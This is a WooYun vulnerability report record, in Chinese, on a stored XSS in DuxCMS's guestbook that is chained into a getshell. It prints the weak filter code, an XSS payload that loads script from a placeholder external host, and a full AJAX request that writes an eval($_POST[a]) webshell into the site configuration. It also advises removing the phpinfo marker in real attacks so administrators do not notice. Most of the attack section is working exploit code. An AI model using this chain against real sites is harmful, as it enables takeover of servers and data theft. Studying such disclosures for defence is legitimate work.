{"id": 54855, "wybug_id": "wooyun-2014-063052", "wybug_title": "duxcms存储跨站导致GETSHELL", "wybug_corp": "DuxCms", "wybug_author": "phith0n", "wybug_date": "2014-06-03 18:31", "wybug_open_date": "2014-09-01 18:32", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "后台盲打"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-03：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-09-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 逗逗让我看的CMS，百度一下用户量还是有的，也没人研究过，我继续试试。这个是盲打，后台直接getshell。 详细说明：  这个cms装上了还挺清新的，感觉比cmseasy要好看一点（都是小企业站）黑盒测试了一下，开始以为留言板xss直接没过滤，打后台，biangbiang响~~后来看了看源码，开发者认为此处是一个富文本框，但又过滤的很少，跟没过滤一样。system/lib/common.function.php 59行开始：\n//html代码输入function html_in($str,$xss=false){\t$search = array (\"'<script[^>]*?>.*?</script>'si\",  // 去掉 javascript\t\t\t\t\t \"'<iframe[^>]*?>.*?</iframe>'si\", // 去掉iframe\t\t\t\t\t);\t$replace = array (\"\",\t\t\t\t\t  \"\",\t\t\t\t\t);\t\tif($xss){\t\t  \t$str=@preg_replace ($search, $replace, $str);\t}\t$str=htmlspecialchars($str);\tif(!get_magic_quotes_gpc()) {\t\t$str = addslashes($str);\t}   return $str;}//html代码输出function html_out($str){\tif(function_exists('htmlspecialchars_decode'))\t\t$str=htmlspecialchars_decode($str);\telse\t\t$str=html_entity_decode($str);    $str = stripslashes($str);\treturn $str;}\n留言时调用html_in插入数据库，后台查看时调用html_out输出。过滤了<script，不过很容易绕过，</script>不闭合即可。后台再getshell比较简单，详见漏洞证明吧。   漏洞证明：  留言板插入xss：\n\n后台查看留言触发：\n\n后台配置文件可以插马，没过滤引号，于是利用这个xss可以getshell。构造一个js，能直接getshell的：http://xxx/sec.js\n$.ajax({\t\"url\": \"http://localhost/duxcms/admin/index.php/setting/save/time-time()\", \t\"type\": \"POST\",\t\"data\": \"sitename=DUXWEB%E5%BC%80%E6%BA%90%E4%B8%AD%E5%BF%83%2Cduxcms%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&seoname=%E5%85%8D%E8%B4%B9%E5%B0%8F%E5%B7%A7%E7%9A%84%E7%BD%91%E7%AB%99%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&siteurl=http%3A%2F%2Fwww.duxcms.com&keywords=%E5%B0%8F%E5%B7%A7CMS%2C%E5%85%8D%E8%B4%B9CMS&description=DUXCMS%E6%98%AF%E4%B8%80%E6%AC%BE%E5%9F%BA%E4%BA%8EPHP%2BMYSQL%2C%E9%87%87%E7%94%A8CANPHP%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99%E7%9A%84%E4%B8%80%E6%AC%BE%E9%92%88%E5%AF%B9%E5%A4%A7%E5%B0%8F%E5%9E%8B%E5%85%AC%E5%8F%B8%E4%BC%81%E4%B8%9A%E3%80%81%E6%94%BF%E5%BA%9C%E7%AD%89%E9%80%9A%E7%94%A8%E7%9A%84%E5%BC%80%E6%BA%90cms%E7%A8%8B%E5%BA%8F%E3%80%82&masteremail=admin%40dxcms.net&copyright=%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF&AUTHO_KEY=000-000-000&DEBUG=true&ERROR_HANDLE=true&URL_REWRITE_ON=false&HTML_CACHE_ON=false&HTML_CACHE_RULE%7Cindex%7C*=5000&HTML_CACHE_RULE%7Cempty%7C*=5000&HTML_CACHE_RULE%7Csearch%7C*=5000&DB_CACHE_ON=false&TPL_CACHE_ON=false&LANG_OPEN=false&LANG_DEFAULT=zh&MOBILE_OPEN=false&MOBILE_DOMAIN=&TPL_TEMPLATE_PATH=themes%2Fdefault%2F&TPL_INDEX=index.html&TPL_COMMON=common.html&TPL_SEARCH=srarch.html&TPL_TAGS=tags.html&TPL_TAGS_INDEX=tags_index.html&TPL_SEARCH_PAGE=20&TPL_TAGS_PAGE=20&TPL_TAGS_INDEX_PAGE=20&ACCESSPRY_SIZE=500&ACCESSPRY_NUM=300&ACCESSPRY_TYPE=jpg%2Cbmp%2Cgif%2Cpng%2Cflv%2Cmp4%2Cmp3%2Cwma%2Cmp4%2C7z%2Czip%2Crar%2Cppt%2Ctxt%2Cpdf%2Cxls%2Cdoc%2Cswf%2Cwmv%2Cavi%2Crmvb%2Crm'%3Bphpinfo()%3Beval(%24_POST%5Ba%5D)%3B%23&WATERMARK_CUTOUT=true&THUMBNAIL_SWIHCH=true&THUMBNAIL_MAXWIDTH=210&THUMBNAIL_MAXHIGHT=110&WATERMARK_SWITCH=false&WATERMARK_PLACE=5&WATERMARK_IMAGE=logo.png\"})\n以上js作为原创加载的js，xss payload如下：\n<script src=//xxx/sec.js></script <span>hello world</span>\n盲打后即可getshell。为了演示我加上了一个phpinfo，实战的时候把他去掉，否则管理员一眼就看出来了：\n\n马已经插入配置文件：\n\n   修复方案：  htmlspecialchar   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-03-10 11:08 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  很不错~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}